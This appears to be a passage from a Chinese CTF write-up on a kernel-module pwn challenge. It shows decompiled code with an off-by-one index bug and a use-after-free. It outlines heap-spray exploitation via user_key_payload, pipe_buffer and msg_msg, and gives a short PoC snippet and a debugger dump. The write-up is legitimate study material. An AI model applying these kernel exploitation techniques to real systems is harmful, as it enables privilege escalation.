<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>heap[i]  内核堆，在堆首部存入我们输入数字
</span></span><span style="display:flex;"><span>heap[i<span style="color:#ff79c6">+</span><span style="color:#bd93f9">15</span>] 判断是否正在使用
</span></span></code></pre></div><p>首先堆的大小：<code>kmalloc_caches[6]</code>0x40，也就是64。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>chunk <span style="color:#ff79c6">=</span> kmem_cache_alloc(kmalloc_caches[<span style="color:#bd93f9">6</span>], <span style="color:#bd93f9">3520LL</span>, <span style="color:#bd93f9">0LL</span>, idx);
</span></span></code></pre></div><p>add: 看作一个树，值比根节点大的放在根左边，小的放在右边</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">__int64</span> <span style="color:#ff79c6">__fastcall</span> <span style="color:#50fa7b">add</span>(<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span> idx)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span> nr; <span style="color:#6272a4">// eax
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#ff79c6">__int64</span> _idx; <span style="color:#6272a4">// rbx
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  _WORD <span style="color:#ff79c6">*</span>_chunk; <span style="color:#6272a4">// rdx
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  _WORD <span style="color:#ff79c6">*</span>chunk; <span style="color:#6272a4">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> ( add_count )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    nr <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">while</span> ( <span style="color:#bd93f9">1</span> )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      _idx <span style="color:#ff79c6">=</span> nr;
</span></span><span style="display:flex;"><span>      _chunk <span style="color:#ff79c6">=</span> heap_var[nr];
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">if</span> ( <span style="color:#ff79c6">!</span>_chunk )
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">break</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">if</span> ( <span style="color:#ff79c6">*</span>_chunk <span style="color:#ff79c6">&lt;</span> idx )
</span></span><span style="display:flex;"><span>      {
</span></span><span style="display:flex;"><span>        nr <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">2</span> <span style="color:#ff79c6">*</span> nr <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">1</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> ( nr <span style="color:#ff79c6">&gt;</span> <span style="color:#bd93f9">0xF</span> )
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">goto</span> LABEL_7;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">else</span>
</span></span><span style="display:flex;"><span>      {
</span></span><span style="display:flex;"><span>        nr <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">2</span> <span style="color:#ff79c6">*</span> nr <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">2</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> ( nr <span style="color:#ff79c6">&gt;</span> <span style="color:#bd93f9">0xF</span> )
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">goto</span> LABEL_7;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    chunk <span style="color:#ff79c6">=</span> kmem_cache_alloc(kmalloc_caches[<span style="color:#bd93f9">6</span>], <span style="color:#bd93f9">3520LL</span>, <span style="color:#bd93f9">0LL</span>, idx);<span style="color:#6272a4">// 0x40
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">--</span>add_count;
</span></span><span style="display:flex;"><span>    heap_var[_idx <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">15</span>] <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">1LL</span>;
</span></span><span style="display:flex;"><span>    heap_var[_idx] <span style="color:#ff79c6">=</span> chunk;
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">*</span>chunk <span style="color:#ff79c6">=</span> idx;
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0LL</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">else</span>
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">LABEL_7</span>:
</span></span><span style="display:flex;"><span>    printk(<span style="color:#ff79c6">&amp;</span>unk_3EE);
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0xFFFFFFFFLL</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>问题出现在如下，可以等于0xf，从而导致 <code>heap[15]</code> 被覆盖。idx=0 可以在free后edit。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">if</span> ( <span style="color:#ff79c6">*</span>_chunk <span style="color:#ff79c6">&lt;</span> idx )
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	nr <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">2</span> <span style="color:#ff79c6">*</span> nr <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">1</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> ( nr <span style="color:#ff79c6">&gt;</span> <span style="color:#bd93f9">0xF</span> )
</span></span><span style="display:flex;"><span>	  <span style="color:#ff79c6">goto</span> LABEL_7;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>delete，free后没有置空</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">__int64</span> <span style="color:#ff79c6">__fastcall</span> <span style="color:#50fa7b">delete</span>(<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span> idx)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">__int64</span> result; <span style="color:#6272a4">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> ( idx <span style="color:#ff79c6">&gt;</span> <span style="color:#bd93f9">0xF</span> <span style="color:#ff79c6">||</span> <span style="color:#ff79c6">!</span>heap_var[idx] <span style="color:#ff79c6">||</span> <span style="color:#ff79c6">!</span>heap_var[idx <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">15</span>] )
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> delete_cold();
</span></span><span style="display:flex;"><span>  kfree(heap_var[idx]);
</span></span><span style="display:flex;"><span>  result <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0LL</span>;
</span></span><span style="display:flex;"><span>  heap_var[idx <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">15</span>] <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0LL</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">return</span> result;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>edit，判断 <code>heap_var[nr + 15]</code> 是否为0，进行edit。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">__int64</span> <span style="color:#ff79c6">__fastcall</span> <span style="color:#50fa7b">edit</span>(<span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int16</span> idx, <span style="color:#ff79c6">__int64</span> buf)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span> nr; <span style="color:#6272a4">// eax
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  _WORD <span style="color:#ff79c6">*</span>chunk; <span style="color:#6272a4">// rdi
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>  nr <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">while</span> ( <span style="color:#bd93f9">1</span> )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">while</span> ( <span style="color:#bd93f9">1</span> )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      chunk <span style="color:#ff79c6">=</span> heap_var[nr];
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">if</span> ( <span style="color:#ff79c6">!</span>chunk )
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0LL</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">if</span> ( <span style="color:#ff79c6">*</span>chunk <span style="color:#ff79c6">&gt;=</span> idx )
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">break</span>;
</span></span><span style="display:flex;"><span>      nr <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">2</span> <span style="color:#ff79c6">*</span> nr <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">1</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">if</span> ( nr <span style="color:#ff79c6">&gt;</span> <span style="color:#bd93f9">0xF</span> )
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0LL</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> ( <span style="color:#ff79c6">*</span>chunk <span style="color:#ff79c6">&lt;=</span> idx )
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">break</span>;
</span></span><span style="display:flex;"><span>    nr <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">2</span> <span style="color:#ff79c6">*</span> nr <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">2</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> ( nr <span style="color:#ff79c6">&gt;</span> <span style="color:#bd93f9">0xF</span> )
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0LL</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> ( <span style="color:#ff79c6">!</span>heap_var[nr <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">15</span>] )
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0LL</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> ( copy_from_user(chunk, buf, <span style="color:#bd93f9">48LL</span>) )
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> edit_cold();
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">else</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0LL</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>但是 <code>*chunk &gt;= idx</code> 的比较需要我们可以控制堆的内容</p>
<h4 id="exploit">exploit</h4>
<p><code>user_key_payload</code> 在调用 rcu 之前不会写入 header，也就是前16个字节不会改变(占据idx=15，因此是很好的利用点。</p>
<ul>
<li>堆喷射 user_key_payload 和 pipe，使用 fcntl 修改 ring_size 大小，使其为 0x40 的slab</li>
<li>uaf 修改 <code>datalen</code> 从而可以越界读取内容。</li>
<li>free user_key_payloay
<ul>
<li>堆喷射 <code>pipe</code>，UAF: 构建二级自写管道 或者 直接改 <code>flags</code> =&gt; <code>dirty pipe</code></li>
</ul>
</li>
</ul>
<p>msg_msg 也是常用的一种方式，可以任意地址读写</p>
<ul>
<li>msg_msg 占位，主从消息，主消息0x40</li>
<li>UAF 修改 m_ts <code>0x1000 - msg_header</code> 进行越界读取，读取到后面的msg</li>
<li>通过其 next 指针进行任意地址读/写</li>
<li>或者使用 CVE-2021-22555 的做法</li>
<li>但是需要猜测其最后两字节的数字</li>
</ul>
<p>PoC</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>  <span style="color:#ff79c6">new</span>(<span style="color:#bd93f9">0x400</span>); <span style="color:#6272a4">// 0
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#ff79c6">new</span>(<span style="color:#bd93f9">0x500</span>); <span style="color:#6272a4">// 1
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#ff79c6">new</span>(<span style="color:#bd93f9">0x600</span>); <span style="color:#6272a4">// 3
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#ff79c6">new</span>(<span style="color:#bd93f9">0x700</span>); <span style="color:#6272a4">// 7
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#ff79c6">delete</span>(<span style="color:#bd93f9">0</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">new</span>(<span style="color:#bd93f9">0x800</span>); <span style="color:#6272a4">// 15
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#ff79c6">delete</span>(<span style="color:#bd93f9">15</span>);
</span></span><span style="display:flex;"><span>  memset(data, <span style="color:#bd93f9">0x32</span>, <span style="color:#ff79c6">sizeof</span>(data));
</span></span><span style="display:flex;"><span>  key_id <span style="color:#ff79c6">=</span> key_alloc(<span style="color:#f1fa8c">&#34;11111111&#34;</span>, data, <span style="color:#bd93f9">0x20</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> (key_id <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">0</span>)
</span></span><span style="display:flex;"><span>      EMSG(<span style="color:#f1fa8c">&#34;key_alloc error&#34;</span>);
</span></span><span style="display:flex;"><span>  debug(<span style="color:#f1fa8c">&#34;heap[15]&#34;</span>);
</span></span></code></pre></div><p>调试如下，两次free+key_alloc后</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwndbg&gt; tele 0xffff88800e65df80
</span></span><span style="display:flex;"><span>00:0000│  0xffff88800e65df80 ◂— 0x800
</span></span><span style="display:flex;"><span>01:0008│  0xffff88800e65df88 ◂— 0x0
</span></span><span style="display:flex;"><span>02:0010│  0xffff88800e65df90 ◂— 0x20 /* <span style="color:#f1fa8c">&#39; &#39;</span> */
</span></span><span style="display:flex;"><span>03:0018│  0xffff88800e65df98 ◂— <span style="color:#f1fa8c">&#39;22222222222222222222222222222222&#39;</span>
</span></span><span style="display:flex;"><span>... ↓     <span style="color:#bd93f9">3</span> skipped
</span></span><span style="display:flex;"><span>07:0038│  0xffff88800e65dfb8 ◂— 0x0
</span></span></code></pre></div><h2 id="参考">参考</h2>
<p><a href="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/heap/slub/spray/#_2">Heap Spray - CTF Wiki (ctf-wiki.org)</a></p>
		</section>

		<div class="post-tags">
			
			
			<nav class="nav tags">
				<ul class="tags">
					
					<li><a href="/tags/ctf">ctf</a></li>
					
					<li><a href="/tags/pwn">pwn</a></li>
					
				</ul>
			</nav>
			
			
		</div>
		<div id="disqus_thread"></div>
<script type="text/javascript">
    (function () {
        
        
        if (window.location.hostname == "localhost")
            return;

        var dsq = document.createElement('script');
        dsq.type = 'text/javascript';
        dsq.async = true;
        var disqus_shortname = 'ldrx30';
        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();
</script>

</article>
</main>
<footer>
  <div style="display:flex"><a class="soc" href="https://github.com/ldrx30" rel="me" title="GitHub"><i data-feather="github"></i></a>
    <a class="border"></a></div>
  <div class="footer-info">
    2024  © ldrx30 |  <a
      href="https://github.com/athul/archie">Archie Theme</a> | Built with <a href="https://gohugo.io">Hugo</a>
  </div>
</footer>
<script>
  feather.replace()
</script></div>
    </body>
</html>
